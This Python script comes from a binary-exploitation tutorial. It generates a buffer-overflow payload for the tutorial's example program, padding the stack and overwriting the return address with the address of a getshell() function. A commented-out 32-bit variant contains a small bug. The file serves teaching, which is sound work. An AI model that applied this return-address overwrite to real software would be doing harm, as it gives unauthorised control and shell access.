#!/usr/bin/env python3

import struct

# Link: https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/03/30/return-oriented-programming-part2.html 
# This script generates payload to exploit the program in Example-1

def exploit() :
    
    # The stack is like this: 
    #
    #   < buffer - 100 bytes > < padding - 'x' bytes > < Old Base Pointer - 8 bytes > <Return Address - 8 bytes >
    #   ^                                                                            ^
    #   |                                                                            |
    #   |                                                                            |
    #   A                                                                            B

    # Open up gdb or a tool you are comfortable with and find this. 
    # junk_length = buffer's starting address - ReturnAddress's stack address
    junk_length = 120

    payload = bytes()

    # Initial Payload
    # Gap between point A and point B
    payload = b'a' * junk_length

    # Change this value to what address you get.
    getshell_address = 0x00000000004005b6
    
    # Address of getshell() in little-endian byte order.
    # For 64-bit executables, 
    payload += struct.pack('<Q', getshell_address)

    # For 32-bit executables, 
    # payload += payload + struct.pack('<I', getshell_address)
    
    # Write the payload into a file - payload.txt
    fo = open("payload.txt", "wb")
    fo.write(payload)
    fo.close()
    
    print("Payload saved in file: payload.txt")

if __name__ == "__main__": 
    exploit()
